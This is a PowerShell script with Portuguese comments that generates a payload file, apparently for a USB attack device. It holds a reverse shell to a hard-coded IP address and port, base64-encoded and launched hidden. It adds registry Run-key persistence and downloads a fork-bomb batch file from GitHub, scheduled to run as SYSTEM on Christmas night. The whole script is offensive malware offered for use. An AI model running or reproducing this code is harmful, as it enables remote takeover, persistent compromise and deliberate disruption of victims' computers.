# Define Payload de Shell-Reverso
$x = @'
$ip = '179.106.231.145';
$port = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient($ip, $port);
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}
WriteToStream '';
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
'@

# Encode do payload de shell-Reverso em Base64
$ShellReverseEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($x))

# Monta o arquivo payload linha a linha
Write-Output '# Salva o comando de shell reversa em uma variavel' > .\payload.txt
Write-Output "`$cmd = `"$ShellReverseEncoded`"" >> .\payload.txt
Write-Output '# Salva a shell reversa e define a pesistencia atraves do registry' >> .\payload.txt
Write-Output 'echo "powershell -W hidden -e $cmd" > C:\Windows\Temp\payload.bat' >> .\payload.txt
Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\Temp\payload.bat"' >> .\payload.txt


# Monta a part do Fork Bomb no arquivo
Write-Output '# Baixa o fork bomb e define para executar na noite de natal' >> .\payload.txt
Write-Output 'Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/bomb.bat?raw=true -o C:\Windows\Temp\bomb.bat' >> .\payload.txt
Write-Output 'schtasks /create /RU "system" /sc once /sd 12/25/2022 /st 22:45 /tr C:\Windows\Temp\bombt.bat /rl highest /tn "bomb"' >> .\payload.txt

#Executa a shell reversa
Write-Output '# Invoca a shell reversa' >> .\payload.txt
Write-Output "powershell -e `$cmd" >> .\payload.txt
